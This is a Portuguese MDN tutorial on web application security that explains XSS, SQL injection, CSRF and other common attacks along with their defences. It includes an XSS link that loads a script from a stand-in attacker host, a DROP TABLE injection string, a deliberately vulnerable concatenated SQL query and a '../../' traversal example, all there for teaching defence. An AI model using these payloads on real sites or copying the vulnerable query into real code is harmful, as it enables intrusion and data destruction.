---
title: Segurança em aplicação web
slug: Learn/Server-side/First_steps/Website_security
---

{{LearnSidebar}}{{PreviousMenu("Learn/Server-side/First_steps/Web_frameworks", "Learn/Server-side/First_steps")}}

A segurança do site requer vigilância em todos os aspectos do design e uso do site. Este artigo introdutório não fará de você um guru da segurança de sites, mas ajudará a entender de onde vem as ameaças e o que você pode fazer para proteger sua aplicação web contra os ataques mais comuns.

<table class="learn-box standard-table">
  <tbody>
    <tr>
      <th scope="row">Pré-requisitos:</th>
      <td>Conhecimento básico em informática.</td>
    </tr>
    <tr>
      <th scope="row">Objetivo:</th>
      <td>
        Entender as ameaças mais comuns à segurança de aplicações web e o que
        você pode fazer para reduzir o risco de invasão do site.
      </td>
    </tr>
  </tbody>
</table>

## O que é segurança no site?

A Internet é um lugar perigoso! Com grande regularidade, ouvimos sobre a indisponibilidade de sites devido a ataques de negação de serviço ou a exibição de informações modificadas (e muitas vezes prejudiciais) em suas páginas iniciais. Em outros casos de alto perfil, milhões de senhas, endereços de email e detalhes de cartão de crédito foram vazados para o domínio público, expondo os usuários do site a vergonha pessoal e risco financeiro.

O objetivo da segurança do site é impedir esse (ou qualquer) tipo de ataque. A definição mais formal de segurança do site é o ato ou prática de proteger sites contra acesso, uso, modificação, destruição ou interrupção não autorizados.

A segurança efetiva do site requer um esforço de design em todo o site: em sua aplicação web, na configuração do servidor da web, em suas políticas para criar e renovar senhas e no código do cliente. Embora tudo isso pareça muito ameaçador, a boa notícia é que, se você estiver usando _framework_ (uma estrutura da web) no servidor, é provável que ele habilitará "por padrão" mecanismos de defesa robustos e bem pensados contra vários ataques mais comuns. Outros ataques podem ser mitigados através da configuração do servidor da web, por exemplo, ativando o HTTPS. Por fim, existem ferramentas de scanner de vulnerabilidades disponíveis publicamente que podem ajudá-lo a descobrir se você cometeu algum erro óbvio.

O restante deste artigo fornece mais detalhes sobre algumas ameaças comuns e algumas das etapas simples que você pode executar para proteger seu site.

> **Nota:** Este é um tópico introdutório projetado para ajudá-lo a começar a pensar na segurança do site, mas não é exaustivo.

## Ameaças à segurança do site

Esta seção lista apenas algumas das ameaças mais comuns do site e como elas são mitigadas. Enquanto você lê, observe como as ameaças são mais bem-sucedidas quando a aplicação web confia ou _não é paranóico o suficiente_ sobre os dados provenientes do navegador.

### Cross-Site Scripting (XSS)

XSS é um termo usado para descrever uma classe de ataques que permitem que um invasor injete scripts do lado do cliente _através_ do site nos navegadores de outros usuários. Como o código injetado chega ao navegador a partir do site, o código é _confiável_ e pode fazer coisas como enviar o cookie de autorização do site do usuário ao invasor. Quando o invasor possui o cookie, ele pode fazer login em um site como se fosse o usuário e fazer tudo que o usário pode, como acessar os detalhes do cartão de crédito, ver detalhes do contato ou alterar senhas.

> **Nota:** As vulnerabilidades XSS têm sido historicamente mais comuns do que qualquer outro tipo de ameaça à segurança.

As vulnerabilidades do XSS são divididas em _refletidas_ e _persistentes_, de acordo como o site retorna os scripts injetados para um navegador.

- Uma vulnerabilidade XSS _refletida_ ocorre quando o conteúdo do usuário passado para o servidor é retornado _imediatamente_ e _não é modificado_ para exibição no navegador. Quaisquer scripts no conteúdo original do usuário serão executados quando a nova página for carregada. Por exemplo, considere uma função de pesquisa no site em que os termos de pesquisa são codificados como parâmetros de URL e esses termos são exibidos junto com os resultados. Um invasor pode construir um link de pesquisa que contenha um script malicioso como parâmetro (por exemplo, `http://sitedecompra.com?q=produto<script%20src="http://sitedomal.com/trapaca.js">`) e enviar por e-mail para outro usuário. Se o usuário alvo clicar nesse "link interessante", o script será executado quando os resultados da pesquisa forem exibidos. Conforme discutido anteriormente, isso fornece ao invasor todas as informações necessárias para entrar no site como usuário alvo, potencialmente fazendo compras como o usuário ou compartilhando suas informações de contato.
- Uma vulnerabilidade _persistente_ do XSS ocorre quando o script mal-intencionado é armazenado no site e posteriormente exibido novamente sem modificação para que outros usuários executem sem querer. Por exemplo, um quadro de discussão que aceita comentários que contêm HTML não modificado pode armazenar um script mal-intencionado de um invasor. Quando os comentários são exibidos, o script é executado e pode enviar ao invasor as informações necessárias para acessar a conta do usuário. Esse tipo de ataque é extremamente popular e poderoso, porque o invasor pode até não ter nenhum envolvimento direto com as vítimas.

Embora os dados das solicitações `POST` ou `GET` sejam a fonte mais comum de vulnerabilidades XSS, qualquer dado do navegador é potencialmente vulnerável, como dados de cookies renderizados pelo navegador ou arquivos de usuário que são carregados e exibidos.

A melhor defesa contra as vulnerabilidades do XSS é remover ou desativar qualquer marcação que possa conter instruções para executar o código. Para HTML, isso inclui elementos, como `<script>`, `<object>`, `<embed>` e `<link>` .

O processo de modificação de dados do usuário para que não possa ser usado para executar scripts ou afetar a execução do código do servidor é conhecido como limpeza de entrada. Muitas estruturas da Web limpam automaticamente a entrada do usuário de formulários HTML por padrão.

### Injeção de SQL

As vulnerabilidades de injeção de SQL permitem que usuários mal-intencionados executem código SQL arbitrário em um banco de dados, permitindo que os dados sejam acessados, modificados ou excluídos, independentemente das permissões do usuário. Um ataque de injeção bem-sucedido pode falsificar identidades, criar novas identidades com direitos de administração, acessar todos os dados no servidor ou destruir/modificar os dados para torná-los inutilizáveis.

Os tipos de injeção SQL incluem injeção SQL baseada em erro, injeção SQL baseada em erros booleanos e injeção SQL baseada em tempo.

Esta vulnerabilidade está presente se a entrada do usuário que é passada para uma instrução SQL subjacente puder alterar o significado da instrução. Por exemplo, o código a seguir tem como objetivo listar todos os usuários com um nome específico (`nomeUsuario)` fornecido a partir de um formulário HTML:

```sql
statement = "SELECT * FROM usuarios WHERE name = '" + nomeUsuario + "';"
```

Se o usuário especificar um nome real, a instrução funcionará como pretendido. No entanto, um usuário mal-intencionado pode alterar completamente o comportamento dessa instrução SQL para a nova instrução no exemplo a seguir, simplesmente especificando o texto em negrito para o `nomeUsuario.`

```sql
SELECT * FROM usuarios WHERE name = 'a';DROP TABLE usuarios; SELECT * FROM userinfo WHERE 't' = 't';
```

A instrução modificada cria uma instrução SQL válida que exclui a tabela de `usuarios` e seleciona todos os dados da tabela `userinfo` (que revela as informações de cada usuário). Isso funciona porque a primeira parte do texto injetado ( `a';`) completa a declaração original.

Para evitar esse tipo de ataque, você deve garantir que os dados do usuário passados para uma consulta SQL não possam alterar a natureza da consulta. Uma maneira de fazer isso é utilizar '[escape](https://pt.wikipedia.org/wiki/Caractere_de_escape)' em todos os caracteres na entrada do usuário que tenham um significado especial no SQL.

> **Nota:** A instrução SQL trata o caractere **'** como o início e o final de uma cadeia de caracteres literal. Ao colocar uma barra invertida na frente desse caractere (**\\'**), "escapamos" do símbolo e dizemos ao SQL para tratá-lo como um caractere (apenas uma parte da string).

Na declaração a seguir, escapamos o caractere **'**. O SQL agora interpretará o nome como toda a string em negrito (que é um nome muito estranho, mas não prejudicial).

```sql
SELECT * FROM usarios WHERE name = 'a\';DROP TABLE usuarios; SELECT * FROM userinfo WHERE \'t\' = \'t';
```

_Frameworks web_ geralmente cuidam do caractere que está escapando para você. O Django, por exemplo, garante que todos os dados do usuário passados para os conjuntos de consultas (consultas de modelo) sejam escapados.

> **Nota:** Esta seção baseia-se fortemente nas informações da [Wikipedia](https://en.wikipedia.org/wiki/SQL_injection).

### Cross-Site Request Forgery (CSRF)

Os ataques de CSRF permitem que um usuário mal-intencionado execute ações usando as credenciais de outro usuário sem o conhecimento ou consentimento desse usuário.

Esse tipo de ataque é melhor explicado por exemplo. John é um usuário mal-intencionado que sabe que um site específico permite que usuários conectados enviem dinheiro para uma conta especificada usando uma solicitação HTTP `POST` que inclui o nome da conta e uma quantia em dinheiro. John cria um formulário que inclui seus dados bancários e uma quantia de dinheiro como campos ocultos e o envia por e-mail a outros usuários do site (com o botão _Enviar_, disfarçado como um link para um site "fique rico rapidamente").

Se um usuário clicar no botão enviar, uma solicitação HTTP `POST` será enviada ao servidor contendo os detalhes da transação e quaisquer cookies do lado do cliente que o navegador associou ao site (adicionar cookies do site associados a solicitações é um comportamento normal do navegador). O servidor irá verificar os cookies e usá-los para determinar se o usuário está ou não conectado e tem permissão para fazer a transação.

O resultado é que qualquer usuário que clicar no botão _Enviar_ enquanto estiver conectado ao site de negociação fará a transação. John fica rico.

> **Nota:** O truque aqui é que John não precisa ter acesso aos cookies do usuário (ou credenciais de acesso). O navegador do usuário armazena essas informações e as inclui automaticamente em todas as solicitações ao servidor associado.

Uma maneira de impedir esse tipo de ataque é o servidor exigir que as solicitações `POST` incluam um segredo gerado pelo site específico do usuário. O segredo seria fornecido pelo servidor ao enviar o formulário da web usado para fazer transferências. Essa abordagem impede John de criar seu próprio formulário, uma vez que ele precisaria conhecer o segredo que o servidor está fornecendo ao usuário. Mesmo se descobrisse o segredo e criasse um formulário para um usuário específico, ele não seria mais capaz de usar o mesmo formulário para atacar todos os usuários.

_Frameworks web_ geralmente incluem esses mecanismos de prevenção para CSRF.

### Outras ameaças

Outros ataques e vulnerabilidades comuns incluem:

- _[Clickjacking](https://www.owasp.org/index.php/Clickjacking)_. Nesse ataque, um usuário mal-intencionado seqüestra cliques destinados a um site de nível superior visível e os direciona para uma página oculta abaixo. Essa técnica pode ser usada, por exemplo, para exibir um site bancário legítimo, mas capturar as credenciais de logon em um invisível controlado pelo invasor. O clickjacking também pode ser usado para fazer com que o usuário clique em um botão em um site visível, mas, ao fazer isso, clique inconscientemente em um botão completamente diferente. Como defesa, seu site pode impedir que ele seja incorporado em um iframe em outro site, definindo os cabeçalhos HTTP apropriados.
- [Negação de Serviço](https://pt.wikipedia.org/wiki/Ataque_de_nega%C3%A7%C3%A3o_de_servi%C3%A7o) (DoS, em inglês). O DoS geralmente é atingido inundando um site de destino com solicitações falsas para que o acesso a um site seja interrompido por usuários legítimos. As solicitações podem ser simplesmente numerosas ou podem consumir grandes quantidades de recursos individualmente (por exemplo, leituras lentas ou upload de arquivos grandes). As defesas de DoS geralmente funcionam identificando e bloqueando o tráfego "ruim" e permitindo a passagem de mensagens legítimas. Essas defesas geralmente estão localizadas antes ou no servidor da web (elas não fazem parte da própria aplicação web).
- _[Directory Traversal](https://en.wikipedia.org/wiki/Directory_traversal_attack) _(arquivo e divulgação). Nesse ataque, um usuário mal-intencionado tenta acessar partes do sistema de arquivos do servidor da web que ele não deve acessar. Essa vulnerabilidade ocorre quando o usuário consegue passar nomes de arquivos que incluem caracteres de navegação do sistema de arquivos (por exemplo, `../../`). A solução é limpar a entrada antes de usá-la.
- [Inclusão de arquivo](/pt-BR/docs/). Nesse ataque, um usuário pode especificar um arquivo "não intencional" para exibição ou execução nos dados passados para o servidor. Quando carregado, esse arquivo pode ser executado no servidor da web ou no lado do cliente (levando a um ataque XSS). A solução é limpar a entrada antes de usá-la.
- [Injeção de comando](/pt-BR/docs/). Os ataques de injeção de comando permitem que um usuário mal-intencionado execute comandos arbitrários do sistema no sistema operacional host. A solução é limpar a entrada do usuário antes que ela possa ser usada nas chamadas do sistema.

Para obter uma lista abrangente das ameaças à segurança do site, consulte [Categoria: explorações de segurança da Web](/pt-BR/docs/)(Wikipedia) e [Categoria: Ataque](/pt-BR/docs/) (Projeto de Segurança para Aplicações Web Abertos).

## Algumas mensagens-chave

Quase todas as explorações de segurança nas seções anteriores são bem-sucedidas quando a aplicação web confia nos dados do navegador. Tudo o que você fizer para melhorar a segurança do seu site, você deve limpar todos os dados originados pelo usuário antes de serem exibidos no navegador, usados em consultas SQL ou passados para um sistema operacional ou para uma chamada do sistema de arquivos.

> **Aviso:** Importante: A lição mais importante que você pode aprender sobre segurança do site é nunca confiar nos dados do navegador. Isso inclui, mas não se limita a dados nos parâmetros de URL de solicitações `GET`, `POST`, cabeçalhos HTTP, cookies e arquivos enviados por usuários. Sempre verifique e limpe todos os dados recebidos. Sempre assuma o pior.

Uma série de outras etapas concretas que você pode executar são:

- Use um gerenciamento de senhas mais eficaz. Incentive senhas fortes que são alteradas regularmente. Considere a autenticação de dois fatores para o seu site, para que, além de uma senha, o usuário insira outro código de autenticação (geralmente um código fornecido com algum hardware físico que somente o usuário terá, como um código em um SMS enviado para seu telefone).
- Configure seu servidor da web para usar [HTTPS](/pt-BR/docs/) e [HTTP Strict Transport Security](/pt-BR/docs/) (HSTS). O HTTPS criptografa os dados enviados entre seu cliente e servidor. Isso garante que credenciais de login, cookies, dados de solicitações `POST` e informações de cabeçalho não estejam facilmente disponíveis para os invasores.
- Acompanhe as ameaças mais populares ([a lista atual do OWASP está aqui](/pt-BR/docs/)) e resolva as vulnerabilidades mais comuns primeiro.
- Use as [ferramentas de verificação de vulnerabilidades](https://www.owasp.org/index.php/Category:Vulnerability_Scanning_Tools) para executar testes de segurança automatizados em seu site. Posteriormente, seu site bem-sucedido também poderá encontrar bugs oferecendo uma recompensa de bugs, [como a Mozilla faz aqui](https://www.mozilla.org/en-US/security/bug-bounty/faq-webapp/).
- Armazene e exiba apenas os dados necessários. Por exemplo, se seus usuários precisam armazenar informações confidenciais, como detalhes do cartão de crédito, exiba apenas o número do cartão suficiente para que possa ser identificado pelo usuário e não o suficiente para que possa ser copiado por um invasor e usado em outro site. O padrão mais comum no momento é exibir apenas os últimos 4 dígitos de um número de cartão de crédito.

_Frameworks web_ podem ajudar a mitigar muitas das vulnerabilidades mais comuns.

## Resumo

Este artigo explicou o conceito de segurança na web e algumas das ameaças mais comuns contra as quais o site deve tentar se proteger. Mais importante, você deve entender que uma aplicação web não pode confiar em nenhum dado do navegador. Todos os dados do usuário devem ser limpos antes de serem exibidos ou usados em consultas SQL e chamadas do sistema de arquivos.

Com este artigo, você chegou ao final [deste módulo](/pt-BR/docs/Learn/Server-side/First_steps), abordando seus primeiros passos na programação de sites em relação ao servidor. Esperamos que você tenha gostado de aprender esses conceitos fundamentais e agora esteja pronto para selecionar um _Framework web_ e iniciar a programação.

{{PreviousMenu("Learn/Server-side/First_steps/Web_frameworks", "Learn/Server-side/First_steps")}}
